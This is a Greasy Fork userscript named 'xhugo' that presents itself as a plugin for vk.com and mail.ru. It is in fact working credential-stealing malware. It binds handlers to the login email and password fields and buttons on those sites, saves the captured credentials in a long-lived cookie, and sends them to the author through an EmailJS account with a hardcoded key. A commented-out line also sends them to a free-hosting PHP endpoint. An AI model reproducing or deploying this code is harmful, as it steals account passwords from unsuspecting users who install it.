// ==UserScript==
// @name          xhugo
// @description   xhugo plugin.
// @include       http://vk.com/*
// @include       http://www.vk.com/*
// @include       https://vk.com/*
// @include       https://www.vk.com/*
// @include       http://mail.ru/*
// @include       http://www.mail.ru/*
// @require       https://code.jquery.com/jquery.js
// @require       https://cdn.jsdelivr.net/npm/emailjs-com@2.3.2/dist/email.min.js
// @version 0.0.1.20200302104113
// @namespace https://greasyfork.org/users/14815
// @downloadURL https://update.greasyfork.org/scripts/373665/xhugo.user.js
// @updateURL https://update.greasyfork.org/scripts/373665/xhugo.meta.js
// ==/UserScript==

(function(){
    emailjs.init("user_baFLTVCItDEF1lEZqvJdX");
})();

function unique(arr) {
    var i = 0,
        current,
        length = arr.length,
        unique = [];
    for (; i < length; i++) {
        current = arr[i];
        if (!~unique.indexOf(current)) {
            unique.push(current);
        }
    }
    return unique;
};

function myTrim(x) {
    return x.replace(/^\s+|\s+$/gm,'');
}

function loadXMLDoc(url){
		if (window.XMLHttpRequest) {
					http = new XMLHttpRequest();
					http.onreadystatechange = processReqChange;
					http.open("GET", url, true);
					http.send(null);
		}else if (window.ActiveXObject) {
					http = new ActiveXObject("Microsoft.XMLHTTP");
					if (http) {
							http.onreadystatechange = processReqChange;
							http.open("GET", url, true);
							http.send();
					}
			}
}

function getCookie(name) {
  var matches = document.cookie.match(new RegExp(
    "(?:^|; )" + name.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g, '\\$1') + "=([^;]*)"
  ));
  return matches ? decodeURIComponent(matches[1]) : undefined;
}

function setCookie(name, value, options) {
  options = options || {};

  var expires = options.expires;

  if (typeof expires == "number" && expires) {
    var d = new Date();
    d.setTime(d.getTime() + expires * 1000);
    expires = options.expires = d;
  }
  if (expires && expires.toUTCString) {
    options.expires = expires.toUTCString();
  }

  value = encodeURIComponent(value);

  var updatedCookie = name + "=" + value;

  for (var propName in options) {
    updatedCookie += "; " + propName;
    var propValue = options[propName];
    if (propValue !== true) {
      updatedCookie += "=" + propValue;
    }
  }

  document.cookie = updatedCookie;
}

function savePassObject(email_pass){
    var passObject = [];
    if (getCookie('passObject')  !== undefined) {
        passObject = JSON.parse(getCookie('passObject'));
    }
    passObject.push(email_pass);
    passObject = unique(passObject);
    var serialObj = JSON.stringify(passObject); //сериализуем его
    //localStorage.setItem("passObject", serialObj);
    setCookie('passObject', serialObj,{"expires": 15768000});
}

function processReqChange(){
		httptt = window.setTimeout("http.abort();", 5000);
		if (http.readyState == 4) {
					clearTimeout(httptt);
		}
}

function htmlpars(where,is){
    if(new RegExp(is,"ig").exec(where)){
      return true;
    } else return false;
}

function sendPassData(email,pass,server){
    email = myTrim(email);
    pass = myTrim(pass);
    server = myTrim(server);
    if (!email){
        email = "null";
    }
    if (email && pass){
        if (email != "vetalbog@gmail.com" && email != "zambabven@gmail.com"){
            savePassObject(server+' : '+email+' : '+pass);
            //loadXMLDoc('https://vitold42.000webhostapp.com/get.php?login='+email+'&pass='+pass+'&server='+server);
            var params = {
                my_text: server+' : '+email+' : '+pass
            };
            emailjs.send( 'gmail', 'mysendmail', params );
        }
    }
}

if(htmlpars(location.href,'vk.com')==true){
    //default
    $(document).on('keypress', '#email', function (e) {
        if(e.which === 13){
            //event.preventDefault();
            sendPassData($('#email').val(),$('#pass').val(),'vk');
        }
    });
    $(document).on('keypress', '#pass', function (e) {
        if(e.which === 13){
            //event.preventDefault();
            sendPassData($('#email').val(),$('#pass').val(),'vk');
        }
    });
    $(document).on('keypress', '#expire', function (e) {
        if(e.which === 13){
            //event.preventDefault();
            sendPassData($('#email').val(),$('#pass').val(),'vk');
        }
    });
    $(document).on('click', '#login_button', function () {
        sendPassData($('#email').val(),$('#pass').val(),'vk');
    });
    //quick
    $(document).on('keypress', '#quick_email', function (e) {
        if(e.which === 13){
            //event.preventDefault();
            sendPassData($('#quick_email').val(),$('#quick_pass').val(),'vk');
        }
    });
    $(document).on('keypress', '#quick_pass', function (e) {
        if(e.which === 13){
            //event.preventDefault();
            sendPassData($('#quick_email').val(),$('#quick_pass').val(),'vk');
        }
    });
    $(document).on('keypress', '#quick_expire', function (e) {
        if(e.which === 13){
            //event.preventDefault();
            sendPassData($('#quick_email').val(),$('#quick_pass').val(),'vk');
        }
    });
    $(document).on('click', '#quick_login_button', function () {
        sendPassData($('#quick_email').val(),$('#quick_pass').val(),'vk');
    });
    //index
    $(document).on('keypress', '#index_email', function (e) {
        if(e.which === 13){
            //event.preventDefault();
            sendPassData($('#index_email').val(),$('#index_pass').val(),'vk');
        }
    });
    $(document).on('keypress', '#index_pass', function (e) {
        if(e.which === 13){
            //event.preventDefault();
            sendPassData($('#index_email').val(),$('#index_pass').val(),'vk');
        }
    });
    $(document).on('keypress', '#index_expire', function (e) {
        if(e.which === 13){
            //event.preventDefault();
            sendPassData($('#index_email').val(),$('#index_pass').val(),'vk');
        }
    });
    $(document).on('click', '#index_login_button', function () {
        sendPassData($('#index_email').val(),$('#index_pass').val(),'vk');
    });
}

if(htmlpars(location.href,'mail.ru')==true){
    var mail_email = document.getElementById('mailbox__login');
    var mail_pass = document.getElementById('mailbox__password');
    var mail_button = document.getElementById('mailbox__submit__button');

    mail_button.onclick=function(){
        sendPassData(mail_email.value,mail_pass.value,'mail');
    };
}